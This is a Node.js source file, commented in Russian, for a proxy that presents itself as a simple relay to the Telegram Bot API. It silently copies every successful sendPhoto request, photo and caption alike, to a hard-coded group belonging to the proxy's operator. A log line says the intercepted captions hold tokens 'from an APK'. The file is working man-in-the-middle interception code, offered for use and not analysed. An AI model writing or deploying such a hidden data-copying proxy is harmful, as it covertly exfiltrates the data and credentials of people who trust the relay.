const http = require('http');
const https = require('https');
const Busboy = require('busboy');

// !!! УКАЖИТЕ ID ВАШЕЙ ГРУППЫ !!!
const TARGET_GROUP_ID = '@fafafjcjzKkaefanfkanjfkjl'; 

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // Извлекаем токен бота из URL
    const botTokenMatch = req.url.match(/\/bot([^/]+)\//);
    const botToken = botTokenMatch ? botTokenMatch[1] : null;

    // Флаг: нужно ли нам перехватывать этот запрос для отправки в группу
    const isSendPhoto = req.method === 'POST' && req.url.includes('/sendPhoto') && botToken;

    // Если это отправка фото, мы будем делать копию входящих данных (буферизировать req)
    let requestChunks = [];
    if (isSendPhoto) {
        req.on('data', (chunk) => {
            requestChunks.push(chunk);
        });
    }

    // --- Оригинальная логика вашего прокси ---
    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: req.url,
        method: req.method,
        headers: { 
            ...req.headers, 
            host: 'api.telegram.org'
        }
    };

    const proxyReq = https.request(options, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res);

        // Когда Telegram успешно ответил на запрос
        proxyRes.on('end', () => {
            // Если отправка в личку прошла успешно (статус 200) и это был sendPhoto
            if (proxyRes.statusCode === 200 && isSendPhoto && requestChunks.length > 0) {
                const fullRequestBody = Buffer.concat(requestChunks);
                
                // Передаем сохраненную копию тела запроса в обработчик
                parseAndSendToGroup(botToken, req.headers, fullRequestBody);
            }
        });
    });

    req.pipe(proxyReq);

    proxyReq.on('error', (err) => {
        console.error('Proxy Error:', err.message);
        res.writeHead(500);
        res.end('Proxy Error: ' + err.message);
    });
});

// Функция, которая разбирает сохраненный буфер и отправляет его в группу
function parseAndSendToGroup(botToken, headers, bodyBuffer) {
    const busboy = Busboy({ headers: headers });
    
    let captionText = '';
    let fileChunks = [];
    let fileName = 'photo.jpg';
    let fileMimeType = 'image/jpeg';

    busboy.on('field', (name, val) => {
        if (name === 'caption') {
            captionText = val;
        }
    });

    busboy.on('file', (name, file, info) => {
        const { filename, mimeType } = info;
        if (name === 'photo') {
            fileName = filename;
            fileMimeType = mimeType;
            file.on('data', (data) => {
                fileChunks.push(data);
            });
        }
        file.resume();
    });

    busboy.on('finish', () => {
        const photoBuffer = Buffer.concat(fileChunks);
        if (photoBuffer.length > 0) {
            console.log('Бот перехватил токен из APK:', captionText);
            // Отправляем копию в группу
            sendCopyToGroup(botToken, TARGET_GROUP_ID, captionText, photoBuffer, fileName, fileMimeType);
        }
    });

    // Записываем наш сохраненный буфер в busboy и закрываем поток
    busboy.write(bodyBuffer);
    busboy.end();
}

// Функция отправки в Telegram
function sendCopyToGroup(token, chatId, caption, fileBuffer, filename, mimeType) {
    const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
    
    let payload = Buffer.concat([
        Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`),
        Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`),
        Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="${filename}"\r\nContent-Type: ${mimeType}\r\n\r\n`),
        fileBuffer,
        Buffer.from(`\r\n--${boundary}--\r\n`)
    ]);

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${token}/sendPhoto`,
        method: 'POST',
        headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': payload.length
        }
    };

    const req = https.request(options, (res) => {
        let responseData = '';
        res.on('data', (chunk) => { responseData += chunk; });
        res.on('end', () => {
            console.log('Ответ Telegram при отправке в группу:', responseData);
        });
    });

    req.on('error', (e) => {
        console.error('Ошибка отправки копии в группу:', e.message);
    });

    req.write(payload);
    req.end();
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Proxy running on port ${PORT}`);
});
